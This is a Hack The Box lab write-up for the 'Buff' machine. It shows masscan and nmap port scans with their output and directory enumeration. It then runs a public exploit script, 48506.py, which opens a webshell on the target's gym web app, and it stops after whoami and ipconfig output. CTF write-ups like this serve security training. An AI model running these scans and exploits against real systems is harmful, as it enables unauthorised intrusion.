# Buff
## Reconnaissance

* Performed TCP and UDP scans using Nmap & Masscan.
```
kali@kali:~/HTB/buff$ sudo masscan -p1-65535 10.10.10.198 --rate=1000 -e tun0 > ports && ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//') && nmap -Pn -sV -sC -A -p$ports 10.10.10.198
[sudo] password for kali: 

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-11-09 05:36:11 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-09 00:37 EST
Nmap scan report for 10.10.10.198
Host is up (0.27s latency).

PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.32 seconds


PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|2008|7 (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (85%), Microsoft Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```

* Web enumeration
```
dirbuster for http://10.10.10.198:8080
Threads:30
extensions:php,aspx,asp,txt
not recursive
```
![image](https://raw.githubusercontent.com/kookiecrack/images/main/dirbuster-buff.png)
![image](https://raw.githubusercontent.com/kookiecrack/images/main/web-enum-buff.png)



kali@kali:~/HTB/buff$ python 48506.py 'http://10.10.10.198:8080/'
            /\                                           
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/                                                                                                    
                                                                                                                  
[+] Successfully connected to webshell.                                                                           
C:\xampp\htdocs\gym\upload> whoami   
                                                         
buff\shaun                                               
                                                                                                                  
C:\xampp\htdocs\gym\upload> ipconfig                                                                              
                                                         
                                                         
Windows IP Configuration                                 
                                                         
                                                         
Ethernet adapter Ethernet0:                              
                                                         
   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::e08d:2e97:530f:20d2
   Temporary IPv6 Address. . . . . . : dead:beef::281a:6286:c82e:b88c
   Link-local IPv6 Address . . . . . : fe80::e08d:2e97:530f:20d2%10
   IPv4 Address. . . . . . . . . . . : 10.10.10.198 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:9eb2%10
                                       10.10.10.2                                                                 
